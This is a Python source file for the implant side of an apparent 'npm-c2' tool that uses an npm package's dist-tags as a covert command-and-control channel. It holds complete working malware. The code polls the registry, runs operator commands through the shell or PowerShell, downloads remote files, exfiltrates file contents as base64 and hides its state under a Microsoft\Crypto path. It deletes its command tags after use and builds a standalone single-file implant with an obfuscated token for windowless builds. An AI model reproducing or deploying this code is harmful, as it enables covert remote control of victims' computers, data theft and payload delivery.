"""Implant side: poll dist-tags, execute, write results back.

Command grammar::

    <anything>                 run via the platform shell, in the persistent cwd
    exec:<cmd> / sh:<cmd>      same, explicit
    ps:<cmd>                   PowerShell (Windows) / pwsh (elsewhere)
    cd:<path>                  change the persistent working directory
    cd                         print the working directory
    timeout:<sec>:<cmd>        run with a per-command timeout
    bg:<cmd>                   start in the background, return a job id
    jobs                       list background jobs
    out:<id>                   current output of a job
    kill:<id>                  terminate a job
    dl:<url>:<path>            download a file
    up:<path>[:<off>[:<len>]]  base64 of a file, or of a byte range
    sleep:<sec>                change the poll interval
    exit                       clear the channel and stop
"""

from __future__ import annotations

import base64
import collections
import json
import os
import platform
import random
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request

from . import (CMD_PREFIX, RES_PREFIX, HBT_PREFIX, TAG_VALUE, MAX_TAG_LEN,
               PREFIXES, _FRAME_OVERHEAD, _MAX_CHUNKS, _SCOPED)
import npm_c2 as _nc
from . import (UA, group_chunks_with_id, encode_payload, decode_tag,
               registry_path)

DEFAULT_TIMEOUT = 30
MAX_TIMEOUT = 3600
MAX_CAPTURE = 12000         # chars kept per reply; a reply spans up to 99 tags
MAX_UPLOAD = 12000          # bytes per `up:` reply
SEEN_CAP = 512              # tags remembered between polls
RETRIES = 3                 # attempts per registry call
AUTO_CLEAN = True           # delete consumed command tags (needs a token)
WINDOWS = platform.system() == "Windows"


def redirect_output():
    """Give a windowed build somewhere to write.

    A pyinstaller ``--noconsole`` build has ``sys.stdout``/``sys.stderr`` set
    to ``None``, so every ``print`` raises ``OSError [WinError 6]`` and the
    daemon dies while logging. Point the *stream objects* at a file (or the
    null device) — that is enough for ``print`` to work and for
    ``subprocess``, which gets explicit ``PIPE``/``DEVNULL`` handles.

    Deliberately does NOT ``os.dup2`` the file descriptors: rebinding fds 1/2
    in a windowed Windows process leaves the CRT and the OS handle table out
    of step, and ``subprocess.wait`` then fails with ``WinError 6`` on an
    invalid process handle. Verified with native/probe_cwd.py under Wine.

    Set ``NPMC2_LOG=<path>`` to keep the output instead of discarding it.
    """
    target = os.environ.get("NPMC2_LOG", "").strip()
    stream = None
    if target:
        try:
            stream = open(os.path.abspath(target), "a", encoding="utf-8",
                          errors="replace", buffering=1)
        except OSError:
            stream = None
    if stream is None:
        try:
            stream = open(os.devnull, "w", encoding="utf-8", errors="replace")
        except OSError:
            return
    if sys.stdout is None:
        sys.stdout = stream
    if sys.stderr is None:
        sys.stderr = stream


class Job:
    """One background command: output captured incrementally."""

    __slots__ = ("id", "command", "proc", "buf", "state", "started")

    def __init__(self, jid, command):
        self.id = jid
        self.command = command
        self.proc = None
        self.buf = []
        self.state = "running"
        self.started = time.time()

    def output(self):
        return "".join(self.buf)[-MAX_CAPTURE:]

    def summary(self):
        age = int(time.time() - self.started)
        rc = getattr(self.proc, "returncode", None)
        return f"{self.id} {self.state} {age}s rc={rc} :: {self.command[:40]}"


class Implant:
    def __init__(self, package, token=None, interval=60, jitter=20, verbose=False):
        self.package = package
        self.url = _nc.API.format(registry_path(package))
        self.token = token
        self.interval = max(10, int(interval))
        self.jitter = max(0, int(jitter))
        self.v = verbose
        # Ordered so overflow evicts the oldest tag, not an arbitrary one.
        self.seen: collections.OrderedDict[str, None] = collections.OrderedDict()
        self.n = 0
        self.dirty = 0
        self.cwd = os.path.expanduser("~")
        self.jobs: dict[str, Job] = {}
        self.pending: dict[str, dict] = {}   # gid -> {total, parts} across polls
        self._jobseq = 0
        safe = package.replace("/", "_").replace("@", "")
        appdata = os.environ.get("APPDATA") or os.environ.get("TEMP") \
            or os.path.expanduser("~")
        self.state_file = os.path.join(appdata, "Microsoft", "Crypto",
                                       f".rsa_{safe}.idx")

    # ------------------------------------------------------------ main loop
    def run(self):
        self._load()
        # A pyinstaller --noconsole build has no stdout/stderr: any print()
        # raises OSError [WinError 6] and would abort every cycle. Point them
        # at the null device before anything can write.
        redirect_output()
        try:
            while True:
                try:
                    self._cycle()
                except Exception as e:                       # noqa: BLE001
                    # Never silent: a broken channel that looks healthy is
                    # worse than a noisy one.
                    if self.v:
                        print(f"[!] cycle failed against {self.url}: "
                              f"{type(e).__name__}: {e}", file=sys.stderr)
                        import traceback as _tb
                        _tb.print_exc(file=sys.stderr)
                if self.v:
                    print(f"[*] poll #{self.n}")
                time.sleep(self.interval + random.uniform(0, self.jitter))
        finally:
            if self.dirty:
                self._save()

    def _cycle(self):
        tags = self._fetch()
        for cmd in self._parse(tags):
            if self.v:
                print(f"[+] cmd: {cmd[:60]}")
            out = self._exec(cmd)
            if out and self.token:
                self._reply(out)
        self.n += 1
        if self.n % 10 == 0:
            if self.dirty:
                self._save()
                self.dirty = 0
            if self.token:
                self._beat()

    # ---------------------------------------------------------------- state
    def _load(self):
        try:
            with open(self.state_file, encoding="utf-8") as f:
                for line in f:
                    line = line.rstrip("\n")
                    if line.startswith("cwd\t"):
                        self.cwd = line[4:]
                    elif line.strip():
                        self.seen[line.strip()] = None
        except FileNotFoundError:
            return
        except OSError as e:
            if self.v:
                print(f"[!] state read failed: {e}", file=sys.stderr)

    def _save(self):
        try:
            os.makedirs(os.path.dirname(self.state_file), exist_ok=True)
            tmp = self.state_file + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                f.write(f"cwd\t{self.cwd}\n")
                for tag in self.seen:
                    f.write(tag + "\n")
            os.replace(tmp, self.state_file)      # atomic: no truncated state
        except OSError as e:
            if self.v:
                print(f"[!] state write failed: {e}", file=sys.stderr)

    def _remember(self, tag):
        self.seen[tag] = None
        self.dirty += 1
        while len(self.seen) > SEEN_CAP:
            self.seen.popitem(last=False)         # drop the oldest first

    # ---------------------------------------------------------------- fetch
    def _fetch(self) -> dict:
        req = urllib.request.Request(self.url, headers={"User-Agent": UA})
        last: BaseException | None = None
        for attempt in range(RETRIES):
            try:
                with urllib.request.urlopen(req, timeout=15) as r:
                    data = json.loads(r.read())
                if not isinstance(data, dict):
                    raise ValueError("registry returned no dist-tags object")
                return data
            except urllib.error.HTTPError as e:
                last = e
                if e.code in (429, 500, 502, 503, 504) and attempt + 1 < RETRIES:
                    time.sleep(self._backoff(attempt, e))
                    continue
                raise
            except (urllib.error.URLError, TimeoutError, ValueError) as e:
                last = e
                if attempt + 1 < RETRIES:
                    time.sleep(self._backoff(attempt, None))
                    continue
                raise
        raise last if last is not None else RuntimeError("fetch failed")

    @staticmethod
    def _backoff(attempt, err):
        """Exponential backoff, honouring Retry-After when the server sends it."""
        if err is not None and getattr(err, "headers", None):
            wait = err.headers.get("Retry-After")
            if wait:
                try:
                    return min(float(wait), 120.0)
                except ValueError:
                    pass
        return min(2 ** attempt + random.uniform(0, 1), 60.0)

    def _parse(self, tags) -> list[str]:
        """Assemble command payloads across polls, then retire their tags.

        Chunks of one command can land in different polls: the registry
        publishes tags in insertion order, Cloudflare may serve a stale map,
        and an operator pushing a multi-tag command is several PUTs. A
        ``fresh-only`` view would then never see a complete group, so partial
        chunks are buffered in ``self.pending`` until the group closes.
        """
        commands: list[str] = []
        fresh = [t for t in tags if t not in self.seen]
        members: dict[str, list[str]] = {}
        for tag in fresh:
            if not tag.startswith(CMD_PREFIX):
                continue
            info = decode_tag(tag)
            if not info:
                continue
            gid = info["gid"]
            members.setdefault(gid, []).append(tag)
            slot = self.pending.setdefault(gid, {"total": info["total"], "parts": {}})
            if slot["total"] != info["total"]:
                continue                       # inconsistent frame, ignore it
            slot["parts"][info["index"]] = info["data"]

        retire: set[str] = set()
        for gid, slot in list(self.pending.items()):
            total = slot["total"]
            if len(slot["parts"]) != total:
                continue                       # still waiting on chunks
            buf = b"".join(slot["parts"][i] for i in range(1, total + 1))
            commands.append(buf.decode("utf-8", errors="replace"))
            retire.update(members.get(gid, ()))
            for tag in tags:                   # also retire chunks seen earlier
                if tag.startswith(CMD_PREFIX):
                    info = decode_tag(tag)
                    if info and info["gid"] == gid:
                        retire.add(tag)
            del self.pending[gid]

        for tag in fresh:
            if tag.startswith(CMD_PREFIX):
                self._remember(tag)
        # Retire a whole group once it has run, so the tag map does not grow
        # without bound (npm slows down as tags accumulate).
        if AUTO_CLEAN and self.token:
            for tag in retire:
                self._del(tag)
        return commands

    # -------------------------------------------------------------- execute
    def _exec(self, cmd):
        try:
            if cmd == "exit":
                self._clean()
                raise SystemExit(0)

            if cmd == "cd":
                return f"cwd={self.cwd}"

            if cmd.startswith("cd:"):
                target = cmd[3:].strip()
                new = os.path.abspath(os.path.join(self.cwd, target))
                if not os.path.isdir(new):
                    return f"cd: no such directory {new}"
                self.cwd = new
                self._save()
                return f"cwd={self.cwd}"

            if cmd == "jobs":
                if not self.jobs:
                    return "no jobs"
                return "\n".join(j.summary() for j in self.jobs.values())

            if cmd.startswith("out:"):
                jid = cmd.split(":", 1)[1].strip()
                job = self.jobs.get(jid)
                if job is None:
                    return f"out: unknown job {jid!r}"
                return f"[{job.summary()}]\n{job.output() or '(no output yet)'}"

            if cmd.startswith("kill:"):
                jid = cmd.split(":", 1)[1].strip()
                job = self.jobs.get(jid)
                if job is None:
                    return f"kill: unknown job {jid!r}"
                self._kill(job)
                return f"killed {jid}"

            if cmd.startswith("bg:"):
                return self._spawn_bg(cmd[3:].strip())

            if cmd.startswith("sleep:"):
                raw = cmd.split(":", 1)[1]
                try:
                    value = int(raw)
                except ValueError:
                    return f"sleep: bad value {raw!r}"
                self.interval = max(10, value)     # same floor as the constructor
                self._save()
                return f"interval={self.interval}"

            if cmd.startswith("dl:"):
                rest = cmd[3:]
                cut = self._split_dl(rest)
                if cut < 0:
                    return "dl: expected dl:<url>:<path>"
                url, path = rest[:cut].strip(), rest[cut + 1:].strip()
                if not url or not path:
                    return "dl: expected dl:<url>:<path>"
                return self._dl(url, path)

            if cmd.startswith("up:"):
                return self._upload(cmd.split(":", 1)[1])

            timeout = DEFAULT_TIMEOUT
            body = cmd
            if body.startswith("timeout:"):
                _, _, rest = body.partition(":")
                raw, sep, tail = rest.partition(":")
                if not sep or not raw.isdigit():
                    return "timeout: expected timeout:<seconds>:<command>"
                timeout = max(1, min(int(raw), MAX_TIMEOUT))
                body = tail

            shell = None
            if body.startswith("ps:"):
                body, shell = body[3:], "powershell"
            elif body.startswith("exec:"):
                body = body[5:]
            elif body.startswith("sh:"):
                body = body[3:]

            return self._run(body, timeout, shell)
        except SystemExit:
            raise
        except Exception as e:                          # noqa: BLE001
            if self.v:
                import traceback as _tb
                print(f"[!] exec failed: {cmd[:60]}", file=sys.stderr)
                _tb.print_exc(file=sys.stderr)
            return f"({type(e).__name__}: {e})"

    def _run(self, body, timeout=DEFAULT_TIMEOUT, shell=None):
        if not body.strip():
            return "(empty command)"
        argv = self._ps_argv(body) if shell == "powershell" else self._shell_argv(body)
        try:
            out, err, rc = self._spawn_capture(argv, timeout)
        except subprocess.TimeoutExpired:
            return f"(timeout after {timeout}s)"
        except FileNotFoundError as e:
            return f"(interpreter not found: {e})"
        combined = (out + err).strip()
        if len(combined) > MAX_CAPTURE:
            cut = len(combined) - MAX_CAPTURE
            combined = combined[:MAX_CAPTURE] + f"\n[truncated {cut} chars]"
        prefix = "" if rc == 0 else f"[rc={rc}] "
        return f"{prefix}{combined or '(no output)'}"

    def _spawn_capture(self, argv, timeout):
        """Run ``argv`` and return ``(stdout, stderr, returncode)``.

        Pipes are the fast path. A pyinstaller ``--noconsole`` build has no
        console handles, and on Windows ``subprocess`` can then fail waiting on
        an invalid process handle (``WinError 6``). Temp files are ordinary
        file handles and always work, so that is the fallback.
        """
        try:
            r = subprocess.run(argv, cwd=self.cwd, capture_output=True,
                               timeout=timeout, stdin=subprocess.DEVNULL)
            return (r.stdout.decode(errors="replace"),
                    r.stderr.decode(errors="replace"), r.returncode)
        except OSError:
            if not WINDOWS:
                raise
        import tempfile
        with tempfile.TemporaryFile() as so, tempfile.TemporaryFile() as se:
            r = subprocess.run(argv, cwd=self.cwd, stdout=so, stderr=se,
                               timeout=timeout, stdin=subprocess.DEVNULL)
            so.seek(0)
            se.seek(0)
            return (so.read().decode(errors="replace"),
                    se.read().decode(errors="replace"), r.returncode)

    @staticmethod
    def _shell_argv(body):
        """The platform shell, named explicitly instead of shell=True.

        Same behaviour as ``shell=True`` on POSIX (``/bin/sh -c``) but the argv
        is auditable, stdin is not inherited, and no second quoting pass is
        applied to ``body``.
        """
        if WINDOWS:
            return ["cmd.exe", "/c", body]
        return ["/bin/sh", "-c", body]

    @staticmethod
    def _ps_argv(body):
        exe = "powershell.exe" if WINDOWS else "pwsh"
        return [exe, "-NoProfile", "-NonInteractive", "-Command", body]

    def _spawn_bg(self, body):
        if not body:
            return "bg: expected bg:<command>"
        self._jobseq += 1
        jid = f"j{self._jobseq}"
        job = Job(jid, body)
        self.jobs[jid] = job

        def worker():
            try:
                job.proc = subprocess.Popen(
                    self._shell_argv(body), cwd=self.cwd,
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    stdin=subprocess.DEVNULL, text=True, errors="replace",
                    bufsize=1)
                for line in job.proc.stdout:
                    job.buf.append(line)
                    if sum(len(x) for x in job.buf) > MAX_CAPTURE * 2:
                        job.buf = ["".join(job.buf)[-MAX_CAPTURE:]]
                job.proc.wait()
                job.state = "done"
            except Exception as e:                      # noqa: BLE001
                job.buf.append(f"\n({type(e).__name__}: {e})")
                job.state = "failed"

        threading.Thread(target=worker, daemon=True).start()
        return f"job {jid} started: {body[:40]}"

    @staticmethod
    def _kill(job):
        if job.proc is not None and job.proc.poll() is None:
            try:
                job.proc.terminate()
            except OSError:
                pass
        job.state = "killed"

    @staticmethod
    def _split_dl(rest):
        """Index of the ':' separating the URL from the destination path.

        Both sides can contain colons (``http://host:8080/x.exe`` and
        ``C:\\temp\\x.exe``), so the separator is the first colon past the
        authority whose right-hand side starts like a path.
        """
        def looks_like_path(tail):
            return bool(tail) and (tail[0] in "/\\" or
                                   (len(tail) > 1 and tail[1] == ":" and tail[0].isalpha()))

        scheme = rest.find("://")
        if scheme >= 0:
            start = scheme + 3
        elif len(rest) > 2 and rest[1] == ":" and rest[0].isalpha():
            start = 2                      # C:\... destination vs. source
        else:
            start = 0

        for i in range(start, len(rest)):
            if rest[i] == ":" and looks_like_path(rest[i + 1:]):
                return i
        if scheme >= 0:
            return rest.rfind(":")         # URL:path with a bare filename
        return rest.find(":", start)

    def _dl(self, url, path):
        if not os.path.isabs(path):
            path = os.path.join(self.cwd, path)
        with urllib.request.urlopen(url, timeout=60) as r:
            data = r.read()
        parent = os.path.dirname(os.path.abspath(path))
        os.makedirs(parent, exist_ok=True)
        with open(path, "wb") as f:
            f.write(data)
        return f"dl {len(data)}b -> {path}"

    def _upload(self, spec):
        """up:<path>[:<offset>[:<length>]] — base64 of the file or a byte range."""
        parts = spec.split(":")
        path = parts[0].strip()
        if not path:
            return "up: expected up:<path>"
        if not os.path.isabs(path):
            path = os.path.join(self.cwd, path)
        try:
            offset = int(parts[1]) if len(parts) > 1 and parts[1] else 0
            length = int(parts[2]) if len(parts) > 2 and parts[2] else MAX_UPLOAD
        except ValueError:
            return "up: offset and length must be integers"
        length = max(1, min(length, MAX_UPLOAD))
        try:
            size = os.path.getsize(path)
            with open(path, "rb") as f:
                f.seek(offset)
                raw = f.read(length)
        except OSError as e:
            return f"up fail: {e}"
        data = base64.b64encode(raw).decode()
        end = offset + len(raw)
        more = "+" if end < size else ""
        return f"up {offset}-{end}/{size}b{more}: {data}"

    # -------------------------------------------------------------- writeback
    def _reply(self, out):
        try:
            for tag in encode_payload(out.encode(), RES_PREFIX):
                self._put(tag)
            if self.v:
                print("[+] result sent")
        except (ValueError, urllib.error.URLError) as e:
            if self.v:
                print(f"[!] result send failed: {e}", file=sys.stderr)

    def _beat(self):
        self._put(f"{HBT_PREFIX}{os.urandom(3).hex()}")

    def _put(self, tag):
        url = f"{self.url}/{tag}"
        headers = {"User-Agent": UA, "Content-Type": "application/json"}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        data = json.dumps(TAG_VALUE).encode()
        for attempt in range(RETRIES):
            req = urllib.request.Request(url, data=data, method="PUT",
                                         headers=headers)
            try:
                with urllib.request.urlopen(req, timeout=20) as r:
                    return 200 <= r.status < 300
            except urllib.error.HTTPError as e:
                if e.code in (429, 500, 502, 503, 504) and attempt + 1 < RETRIES:
                    time.sleep(self._backoff(attempt, e))
                    continue
                if self.v:
                    print(f"[!] PUT {tag[:24]}: HTTP {e.code}", file=sys.stderr)
                return False
            except urllib.error.URLError as e:
                if attempt + 1 < RETRIES:
                    time.sleep(self._backoff(attempt, None))
                    continue
                if self.v:
                    print(f"[!] PUT {tag[:24]}: {e.reason}", file=sys.stderr)
                return False
        return False

    def _clean(self):
        if not self.token:
            return
        try:
            for name in self._fetch():
                if name.startswith((CMD_PREFIX, RES_PREFIX, HBT_PREFIX)):
                    self._del(name)
        except Exception as e:                          # noqa: BLE001
            if self.v:
                print(f"[!] cleanup failed: {e}", file=sys.stderr)

    def _del(self, tag):
        headers = {"User-Agent": UA}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        req = urllib.request.Request(f"{self.url}/{tag}", method="DELETE",
                                     headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=15):
                return True
        except urllib.error.URLError:
            return False


def generate_standalone(token=None, package=None):
    """Emit a dependency-free single-file implant."""
    import inspect

    from . import (deobfuscate_token as _deob, _xor as _xor_fn,
                   _xor_key as _xor_key_fn, group_chunks as _gc)

    obf = ""
    if token and package:
        from . import obfuscate_token
        obf = obfuscate_token(token, package)

    parts = [
        "#!/usr/bin/env python3",
        "import argparse, base64, binascii, collections, hashlib, json, os",
        "import platform, random, subprocess, sys, threading, time",
        "import urllib.error, urllib.request",
        "",
        f"CMD_PREFIX = {CMD_PREFIX!r}",
        f"RES_PREFIX = {RES_PREFIX!r}",
        f"HBT_PREFIX = {HBT_PREFIX!r}",
        f"PREFIXES = {PREFIXES!r}",
        f"TAG_VALUE = {TAG_VALUE!r}",
        f"MAX_TAG_LEN = {MAX_TAG_LEN}",
        f"API = {_nc.API!r}",
        "",
        "# The Implant class reaches the registry through this shim so both the",
        "# package build and a generated standalone resolve the same URL.",
        "class _nc:",
        "    API = API",
        f"UA = {UA!r}",
        f"_FRAME_OVERHEAD = {_FRAME_OVERHEAD}",
        f"_MAX_CHUNKS = {_MAX_CHUNKS}",
        f"_SCOPED = {_SCOPED!r}",
        f"DEFAULT_TIMEOUT = {DEFAULT_TIMEOUT}",
        f"MAX_TIMEOUT = {MAX_TIMEOUT}",
        f"MAX_CAPTURE = {MAX_CAPTURE}",
        f"MAX_UPLOAD = {MAX_UPLOAD}",
        f"SEEN_CAP = {SEEN_CAP}",
        f"RETRIES = {RETRIES}",
        f"AUTO_CLEAN = {AUTO_CLEAN}",
        "WINDOWS = platform.system() == 'Windows'",
        "",
        inspect.getsource(_xor_key_fn),
        "",
        inspect.getsource(_xor_fn),
        "",
        inspect.getsource(_deob),
        "",
        inspect.getsource(registry_path),
        "",
        inspect.getsource(encode_payload),
        "",
        inspect.getsource(decode_tag),
        "",
        inspect.getsource(_gc),
        "",
        inspect.getsource(group_chunks_with_id),
        "",
        inspect.getsource(redirect_output),
        "",
        inspect.getsource(Job),
        "",
        inspect.getsource(Implant),
        "",
    ]
    if obf:
        parts += [
            f"_OBFUSCATED = {obf!r}",
            "",
            "def _embedded_token(pkg):",
            "    return deobfuscate_token(_OBFUSCATED, pkg)",
            "",
        ]

    parts += [
        "def main():",
        "    redirect_output()   # --noconsole build: stdout/stderr are None",
        "    p = argparse.ArgumentParser(description='npm-c2 implant')",
        "    p.add_argument('--package', '-p', required=True)",
        "    p.add_argument('--token', '-t', default=None)",
        "    p.add_argument('--interval', type=int, default=60)",
        "    p.add_argument('--jitter', type=int, default=20)",
        "    p.add_argument('--verbose', '-v', action='store_true')",
        "    a = p.parse_args()",
    ]
    if obf:
        parts.append("    tok = a.token or _embedded_token(a.package)")
    else:
        parts.append("    tok = a.token")
    parts += [
        "    if not tok:",
        "        print('[!] no token: this implant can execute but not reply',",
        "              file=sys.stderr)",
        "    Implant(a.package, tok, a.interval, a.jitter, a.verbose).run()",
        "",
        "",
        "if __name__ == '__main__':",
        "    main()",
    ]
    return "\n".join(parts)
